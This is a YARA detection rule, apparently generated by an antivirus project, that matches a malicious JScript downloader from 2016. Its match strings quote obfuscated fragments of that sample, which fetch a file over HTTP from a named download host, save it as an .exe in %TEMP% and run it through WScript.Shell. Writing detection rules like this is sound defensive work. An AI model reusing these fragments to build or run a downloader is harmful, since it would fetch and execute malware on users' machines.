rule sig_20160328_1929c64366ae9e9742ae78a1072db458 {
  meta:
    description = "datamaliciousorder - file 20160328_1929c64366ae9e9742ae78a1072db458.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "40a87faa6911e21112d020622acbf3a4774264012a637929999d0e1e69ed96b5"

  strings:
    $s1  = "function Alyhino() {return Hxcrpvu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"qQdscB4jVv.exe\";};" fullword ascii
    $s2  = "Obkjiyrs[Lrzvhfxkx](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Ybwggl](Jnriq() * 11)} while (Obkjiyrs[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Hxcrpvu = function Mltvym() {return WScript[Sfxhtnv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tkimylqctw(Zhfxpa, Yjxbvildlw){return Zhfxpa - Yjxbvildlw;};" fullword ascii
    $s6  = "function Lvvhlr(Zesfu){Hxcrpvu[\"Run\"](Zesfu, Rqrzkkso, Rqrzkkso);};" fullword ascii
    $s7  = "function Nkdqyozr() {return ((Gbumvtcndz == true) && (Gbumvtcndz == Qwaiit)) ? 1 : Rqrzkkso;};" fullword ascii
    $s8  = "function Tovheyyy()" fullword ascii
    $s9  = " while (Ltumhoic){" fullword ascii
    $s10 = "function Qcglz(){return Sfxhtnv;};" fullword ascii
    $s11 = "function Jnriq(){return 22;};" fullword ascii
    $s12 = "Qwaiit = true; " fullword ascii
    $s13 = "Gbumvtcndz = true; " fullword ascii
    $s14 = "var Qwaiit = false;" fullword ascii
    $s15 = "var Vlddvc = false;" fullword ascii
    $s16 = "function Vcrrraclo(Nqtzmnrniz) {var Lbcicr = (1, 2, 3, 4, 5, Nqtzmnrniz); return Lbcicr;};" fullword ascii
    $s17 = "var Gbumvtcndz = false;" fullword ascii
    $s18 = "var Znvisknh = new this[\"Date\"]();" fullword ascii
    $s19 = "function Dgaafcfov(){return Osnmlumqhb;};" fullword ascii
    $s20 = "return Tkimylqctw(Wmzenlmz, Nnmdytc);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}